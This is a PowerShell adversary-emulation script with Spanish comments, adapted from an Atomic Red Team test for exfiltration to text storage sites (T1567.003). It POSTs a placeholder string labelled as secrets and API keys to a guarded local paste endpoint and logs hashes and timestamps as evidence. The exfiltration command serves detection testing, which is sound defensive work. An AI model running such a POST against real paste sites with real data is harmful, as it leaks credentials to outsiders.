# ATA059 - T1567.003 Exfiltration to Text Storage Sites (Windows)
# ART adaptado: atomic T1567.003 "Exfiltrate data with HTTP POST to text storage sites -
# pastebin.com (Windows)" guid c2e8ab6e-431e-460a-a2aa-3bc6a32022e3.
# Adaptacion: pastebin.com -> paste.local:9090 (sitio de pegado local) y el cuerpo se envia
# como texto plano UTF-8 (en vez del formulario api_dev_key/api_paste_code) para poder
# demostrar su sha256. El mecanismo (POST HTTP del dato a un sitio de texto) se conserva.
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ev = Join-Path $dir 'evidencias'
New-Item -ItemType Directory -Force -Path $ev | Out-Null

$url = 'http://192.168.65.1:9090/paste/ATA059'
if ($url -notlike 'http://192.168.65.1:9090/*') {
    'GUARDARRAIL: destino no permitido' | Out-File (Join-Path $ev 'efecto_local.txt') -Encoding ascii
    exit 2
}

$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$content = "secrets, api keys, passwords - T1567.003 atomic test"
[System.IO.File]::WriteAllText((Join-Path $ev 'paste.txt'), $content, (New-Object System.Text.UTF8Encoding($false)))

# --- comando ART (c2e8ab6e), endpoint local ---
$status = ''
try {
    $r = Invoke-RestMethod -Uri $url -Method Post -Body $content -ContentType 'text/plain'
    $status = 'HTTP=200'
} catch {
    $status = 'ERROR=' + $_.Exception.Message
}
# --- fin comando ART ---

$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$sha = (Get-FileHash (Join-Path $ev 'paste.txt') -Algorithm SHA256).Hash.ToLower()
@(
    "ata=ATA059",
    "tecnica=T1567.003",
    "fuente=ART_adaptado",
    "guid=c2e8ab6e-431e-460a-a2aa-3bc6a32022e3",
    "t0=$t0",
    "t1=$t1",
    "url=$url",
    "sha256_body=$sha",
    "len_body=$($content.Length)",
    "resultado=$status"
) | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
@("t0=$t0", "t1=$t1") | Out-File -FilePath (Join-Path $ev 'times.log') -Encoding ascii
exit 0
